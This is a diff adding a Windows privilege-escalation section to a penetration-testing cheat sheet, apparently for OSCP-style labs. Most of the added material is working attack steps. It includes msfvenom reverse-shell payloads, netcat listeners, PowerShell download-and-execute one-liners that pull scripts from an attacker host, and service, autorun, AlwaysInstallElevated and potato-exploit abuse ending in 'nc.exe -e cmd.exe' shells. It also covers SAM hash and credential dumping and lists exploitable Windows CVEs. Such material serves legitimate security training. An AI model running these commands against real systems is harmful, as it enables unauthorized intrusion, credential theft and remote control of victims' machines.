@@ -42,13 +42,14 @@
   - [MIMIKATZ](#mimikatz)
   - [MISCELLANEOUS](#miscellaneous)
   - [MSFVENOM PAYLOAD](#msfvenom-payload)
-- [Multihandler Listener](#multihandler-listener)
+  - [Multihandler Listener](#multihandler-listener)
   - [PASSWORD CRACKING](#password-cracking)
   - [PIVOTING](#pivoting)
   - [LINUX PRIVILEGE ESCALATION](#linux-privilege-escalation)
     - [Linux Priv Esc troubleshooting](#linux-priv-esc-troubleshooting)
     - [Linux Troubleshooting](#linux-troubleshooting)
   - [WINDOWS PRIVILEGE ESCALATION](#windows-privilege-escalation)
+    - [Windows Troublshooting](#windows-troublshooting)
   - [PROOFS](#proofs)
   - [REVERSE SHELL](#reverse-shell)
   - [SHELLSHOCK](#shellshock)
@@ -1112,7 +1113,7 @@ Available in PDF, DOCX and Markdown format!
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
 |    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |
 
-# Multihandler Listener
+## Multihandler Listener
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
 ```
 msf>use exploit/multi/handler  
@@ -1126,10 +1127,10 @@ The -j option is to keep all the connected session in the background.
 
 
 - References
-<https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675>
-<https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/>
-<http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
-<https://raw.githubusercontent.com/frizb/MSF-Venom-Cheatsheet/master/README.md>
+  - <https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675>
+  - <https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/>
+  - <http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/>
+  - <https://github.com/frizb/MSF-Venom-Cheatsheet>
 
 - Listener
   - Metasploit
@@ -1282,6 +1283,467 @@ The -j option is to keep all the connected session in the background.
   - [sushant747 - privilege_escalation_windows](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
   - [SecWiki - windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
+- Attacks
+  - Test if powershell is working without breaking shell
+  - `powershell whoami`
+  - Pivot DoS to powershell using Nishang reverse powershell script.
+  - Listen w/ nc on a new port.
+  - Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
+  - Start an HTTP server in the root directoy of the modified nishang script copy
+  - Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
+  - Go to your listener terminal, you should now have a reverse PS shell
+  - Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
+  - `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
+  - Download file
+  - PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
+  - Run cmd as other user
+  - PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
+  - DOS > `\Windows\System32\runas.exe`
+  - Run exe
+  - PS from working directory `Start-Process -FilePath "sort.exe"`
+  - PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
+  - PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
+  - PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
+  - Decrypy SAM password hashes
+  - `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
+  - Determine admin accounts
+  - DOS: `net localgroup administrators`
+  - SAM and SYSTEM file location
+  - `Windows/System32/config`
+  - Log into remote windows host with stolen creds (SMB required)
+  - `psexec.py user@ip`
+  - Find shortcut location (`*.lnk`)
+  - PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
+  - Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
+  - Check panther directory, install logs get put in here and contain creds
+  - Read contents of file in PS shell
+  - `get-Content "filename"`
+
+- Windows
+  - Enumeration scripts
+
+  - General scans
+    - 
+      ```
+      winPEAS.exe
+      windows-privesc-check2.exe
+      Seatbelt.exe -group=all
+      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+      Powerless.bat
+      winPEAS.bat
+      ```
+
+- Search for CVE
+  - systeminfo > systeminfo.txt
+  - `python windows-exploit-suggester.py --update`
+  - `python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt`
+
+  - systeminfo > systeminfo.txt
+  - 
+    ```
+    wmic qfe > qfe.txt
+    python wes.py -u
+    python wes.py systeminfo.txt qfe.txt
+    ```
+
+  - powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+
+- Post exploitation
+  - lazagne.exe all
+  - SharpWeb.exe
+  - mimikatz.exe
+
+- JuicyPotato (SeImpersonate or SeAssignPrimaryToken)
+  - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
+
+    - `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *`
+    - `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>`
+
+  - CLSID
+    - <https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md>
+
+- Methodology to follow
+  - <https://guif.re/windowseop>
+  - <https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/>
+  - <https://mysecurityjournal.blogspot.com/p/client-side-attacks.html>
+  - <http://www.fuzzysecurity.com/tutorials/16.html>
+  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>
+
+- Autorun
+  - Detection
+    - `powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"`
+    - 
+      ```
+      [*] Checking for modifiable registry autoruns and configs...
+
+      Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+      Path           : "C:\Program Files\Autorun Program\program.exe"
+      ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}\
+      ```
+
+- or
+
+- winPEAS.exe
+  - 
+    ```
+    [+] Autorun Applications(T1010)
+        Folder: C:\Program Files\Autorun Program
+        File: C:\Program Files\Autorun Program\program.exe
+        FilePerms: Everyone [AllAccess]
+    ```
+
+- Exploitation
+  - Attacker
+    - 
+      ```
+      msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+      sudo python -m SimpleHTTPServer 80
+      sudo nc -lvp <PORT>
+      ```
+
+- Victim
+  - 
+    ```
+    cd C:\Program Files\Autorun Program\
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+    To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+    ```
+
+- AlwaysInstallElevated
+  - Detection
+  - 
+      ```
+      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+      [*] Checking for AlwaysInstallElevated registry key...
+
+      AbuseFunction : Write-UserAddMSI
+      ```
+
+  - or
+    - 
+      ```
+      reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+      reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+      If both values are equal to 1 then it's vulnerable.
+      ```
+
+  - or
+    - 
+      ```
+      winPEAS.exe
+
+      [+] Checking AlwaysInstallElevated(T1012)
+
+        AlwaysInstallElevated set to 1 in HKLM!
+        AlwaysInstallElevated set to 1 in HKCU!
+      ```
+
+- Exploitation
+  - Attacker
+  - 
+    ```
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
+    sudo python -m SimpleHTTPServer 80
+    sudo nc -lvp <PORT>
+    ```
+
+  - Victim
+  - 
+    ```
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
+    msiexec /quiet /qn /i C:\Temp\program.msi
+    ```
+
+- Executable Files
+  - Detection
+  - 
+    ```
+    powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+    [*] Checking service executable and argument permissions...
+
+    ServiceName                     : filepermsvc
+    Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+    ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+    ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+    ModifiableFileIdentityReference : Everyone
+    StartName                       : LocalSystem
+    AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+    CanRestart                      : True
+    ```
+
+- or
+  - 
+    ```
+    winPEAS.exe
+
+    [+] Interesting Services -non Microsoft-(T1007)
+
+    filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+      File Permissions: Everyone [AllAccess]
+    ```
+
+- Exploitation
+  - Attacker
+  - 
+    ```
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+    sudo python -m SimpleHTTPServer 80
+    sudo nc -lvp <PORT>
+    ```
+
+  - Victim
+    - 
+      ```
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
+      copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+      sc start filepermsvc
+      ```
+
+- Startup applications
+  - Detection
+  - 
+    ```
+    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+    C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+                                                                TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+                                                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                                BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                                BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                                Everyone:(I)(OI)(CI)(RX)
+
+    If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+    ```
+
+- Exploitation
+  - Attacker
+  - 
+    ```
+    msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+    sudo python -m SimpleHTTPServer 80
+    sudo nc -lvp <PORT>
+    ```
+
+  - Victim
+  - 
+    ```
+    cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+    To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+    ```
+
+- Weak service permission
+  - Detection
+    - 
+      ```
+      # Find all services authenticated users have modify access onto
+      accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+      if SERVICE_ALL_ACCESS then vulnerable
+
+      # Find all weak folder permissions per drive.
+      accesschk.exe /accepteula -uwdqs Users c:\
+      accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+      # Find all weak file permissions per drive.
+      accesschk.exe /accepteula -uwqs Users c:\*.*
+      accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+      ```
+
+  - or
+    - 
+      ```
+      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+      [*] Checking service permissions...
+
+      ServiceName   : daclsvc
+      Path          : "C:\Program Files\DACL Service\daclservice.exe"
+      StartName     : LocalSystem
+      AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+      CanRestart    : True
+      ```
+
+  - or
+    - 
+      ```
+      winPEAS.exe
+
+      [+] Interesting Services -non Microsoft-(T1007)
+
+      daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+        YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+
+      [+] Modifiable Services(T1007)
+        LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+        daclsvc: WriteData/CreateFiles
+      ```
+  - Exploitation
+    - 
+      ```
+      # Attacker
+      sudo python -m SimpleHTTPServer 80
+      sudo nc -lvp <PORT>
+
+      # Victim
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+      sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+      sc start <SERVICENAME>
+      or 
+      net start <SERVICENAME>
+      ```
+
+- Unquoted service paths
+  - Detection
+    - 
+      ```
+      powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+      [*] Checking for unquoted service paths...
+
+      ServiceName    : unquotedsvc
+      Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+      ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
+      StartName      : LocalSystem
+      AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+      CanRestart     : True
+
+      ServiceName    : unquotedsvc
+      Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+      ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
+      StartName      : LocalSystem
+      AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+      CanRestart     : True
+      ```
+
+    - or
+      - 
+      ```
+      winPEAS.exe
+
+      [+] Interesting Services -non Microsoft-(T1007)
+
+      unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+      ```
+
+    - Exploitation
+      - 
+      ```
+      # Attacker
+      msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
+      sudo python -m SimpleHTTPServer 80
+      sudo nc -lvp <PORT>
+
+      # Victim
+      cd "C:\Program Files\Unquoted Path Service\"
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
+      sc start unquotedsvc
+      ```
+
+- Hot potato
+  - Exploitation
+    - 
+      ```
+      # Attacker
+      sudo python -m SimpleHTTPServer 80
+      sudo nc -lvp <PORT>
+
+      # Victim
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+      powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
+      powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
+      ```
+
+- CVE
+- Already compiled exploit
+  - <https://github.com/SecWiki/windows-kernel-exploits>
+  - <https://github.com/abatchy17/WindowsExploits>
+  - <https://github.com/cyber-prog0x/PoC-Bank>
+
+- Windows XP
+- 
+  ```
+  CVE:Description
+  CVE-2002-1214:ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS
+  CVE-2003-0352:ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service
+  CVE-2003-0533:MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service
+  CVE-2003-0719:ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow
+  CVE-2003-0812:ms03_049_netapi - exploits a stack buffer overflow in the NetApi32
+  CVE-2003-0818:ms04_007_killbill - vulnerability in the bit string decoding code in the Microsoft ASN.1 library
+  CVE-2003-0822:ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051
+  CVE-2004-0206:ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service
+  CVE-2010-3138:EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse
+  CVE-2010-3147:EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse
+  CVE-2010-3970:ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution
+  CVE-2011-1345:Internet Explorer does not properly handle objects in memory - allows remote execution of code via object
+  CVE-2011-5046:EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution
+  CVE-2012-4349:Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root
+  ```
+
+- Windows 7
+- 
+  ```
+  CVE:Description
+  CVE-2010-0232:ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit
+  CVE-2010-2568:ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload
+  CVE-2010-2744:EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation
+  CVE-2010-3227:EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution
+  CVE-2014-4113:ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution
+  CVE-2014-4114:ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution
+  CVE-2015-0016:ms15_004_tswbproxy - abuses a process creation policy in Internet Explorer’s sandbox - code execution
+  CVE-2018-8494:remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input
+  ```
+
+- Windows 8
+- 
+  ```
+  CVE:Description
+  CVE-2013-0008:ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation
+  CVE-2013-1300:ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation
+  CVE-2013-3660:ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption
+  CVE-2013-3918:ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution
+  CVE-2013-7331:ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine’s filenames
+  CVE-2014-6324:ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation
+  CVE-2014-6332:ms14_064_ole_code_execution - exploits the Windows OLE Automation array vulnerability
+  CVE-2014-6352:ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution
+  CVE-2015-0002:ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation
+  ```
+
+- Windows 10
+- 
+  ```
+  CVE:Description
+  CVE-2015-0057:exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine
+  CVE-2015-1769:MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege
+  CVE-2015-2426:ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver
+  CVE-2015-2479:MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege
+  CVE-2015-2513:MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution
+  CVE-2015-2423:MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure
+  CVE-2015-2431:MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution
+  CVE-2015-2441:MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution
+  ```
+
+- Windows Server 2003
+- 
+  ```
+  CVE:Description
+  CVE-2008-4250:ms08_067_netapi - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX
+  CVE-2017-8487:allows an attacker to execute code when a victim opens a specially crafted file - remote code execution
+  ```
+
+### Windows Troublshooting
+
+- Have you checked for vuln apps in program files?
+- Have you noticed any running processes that look obviously suspicious?
+- Have you check all files in /Users directory (ie. /Desktop, /Documents
+- Have you checked for hidden files?
+- `dir /ah`
 
 
 ## PROOFS
